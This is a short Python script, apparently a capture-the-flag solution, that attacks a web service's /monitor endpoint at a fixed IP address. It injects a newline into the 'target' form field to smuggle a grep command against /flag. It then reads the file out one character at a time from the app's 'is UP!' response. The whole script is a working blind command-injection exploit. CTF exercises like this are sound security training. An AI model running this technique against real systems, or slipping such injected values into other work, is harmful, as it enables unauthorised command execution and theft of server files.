import requests
import string

url = "http://18.140.51.69:5000/monitor"
# The characters we expect to find in the flag
alphabet = "}" + string.ascii_lowercase + string.ascii_uppercase + string.digits + "_-!"
flag = "0DAY{"

print(f"[*] Starting exfiltration from: {flag}")

session = requests.Session()

while not flag.endswith("}"):
    found_char = False
    for char in alphabet:
        # Use %0a (newline) as the injector
        # We escape the char to ensure symbols like '!' or '_' don't break the shell
        test_flag = flag + char
        payload = f"google.com%0agrep '^{test_flag}' /flag"
        
        try:
            r = session.post(url, data={'target': payload})
            
            # Logic: If grep returns 0 (found), the app echoes "is UP!"
            if "is UP!" in r.text:
                flag += char
                print(f"[!] Flag updated: {flag}")
                found_char = True
                break
        except Exception as e:
            print(f"[?] Error at {char}: {e}")

    if not found_char:
        print("[X] Character not found. Possible end of file or restricted charset.")
        break

print(f"\n[+] Final Flag: {flag}")
